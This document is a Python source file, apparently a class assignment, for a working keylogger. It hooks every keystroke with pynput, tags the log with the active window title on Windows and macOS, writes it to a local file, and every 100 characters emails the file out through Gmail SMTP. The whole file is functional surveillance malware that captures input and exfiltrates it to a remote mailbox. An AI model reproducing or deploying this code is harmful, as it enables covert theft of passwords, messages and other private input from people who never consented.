import smtplib
import os
import platform
from email.mime.multipart import MIMEMultipart
from email.mime.base import MIMEBase
from email import encoders
from pynput import keyboard

CORREO_USUARIO = "correo"
CORREO_PASS = "contraseña"
N_CARACTERES = 100

ventana_actual = ""
buffer_teclas = ""
nombre_archivo = "datos_keylogger.txt"

def enviar_correo():
    if not os.path.exists(nombre_archivo):
        return
    msg = MIMEMultipart()
    msg['From'] = CORREO_USUARIO
    msg['To'] = CORREO_USUARIO
    msg['Subject'] = "Reporte Keylogger - Programación II"
    try:
        with open(nombre_archivo, "rb") as adjunto:
            parte = MIMEBase('application', 'octet-stream')
            parte.set_payload(adjunto.read())
            encoders.encode_base64(parte)
            parte.add_header('Content-Disposition', f"attachment; filename={nombre_archivo}")
            msg.attach(parte)
        server = smtplib.SMTP('smtp.gmail.com', 587)
        server.starttls()
        server.login(CORREO_USUARIO, CORREO_PASS)
        server.sendmail(CORREO_USUARIO, CORREO_USUARIO, msg.as_string())
        server.quit()
    except:
        pass

def guardar_local():
    global buffer_teclas
    if buffer_teclas:
        with open(nombre_archivo, "a", encoding="utf-8") as f:
            f.write(buffer_teclas)
        buffer_teclas = ""

def obtener_ventana():
    so = platform.system()
    if so == "Windows":
        try:
            import pygetwindow as gw
            return gw.getActiveWindow().title
        except:
            return "Desconocido"
    elif so == "Darwin":
        script = 'tell application "System Events" to get name of (first process whose frontmost is true)'
        return os.popen(f"osascript -e '{script}'").read().strip()
    return "Linux/Otro"

def al_presionar(tecla):
    global ventana_actual, buffer_teclas
    nueva = obtener_ventana()
    if nueva != ventana_actual:
        guardar_local()
        ventana_actual = nueva
        buffer_teclas += f"\n\n[ APLICACIÓN: {ventana_actual} ]\n" + "-" * 20 + "\n"
    try:
        buffer_teclas += tecla.char
    except AttributeError:
        mapeo = {keyboard.Key.space: " ", keyboard.Key.enter: "\n", keyboard.Key.backspace: "<-"}
        buffer_teclas += mapeo.get(tecla, f"[{tecla.name}]")
    if len(buffer_teclas) >= N_CARACTERES:
        guardar_local()
        enviar_correo()

def al_soltar(tecla):
    if tecla == keyboard.Key.esc:
        guardar_local()
        enviar_correo()
        return False

with keyboard.Listener(on_press=al_presionar, on_release=al_soltar) as h:
    h.join()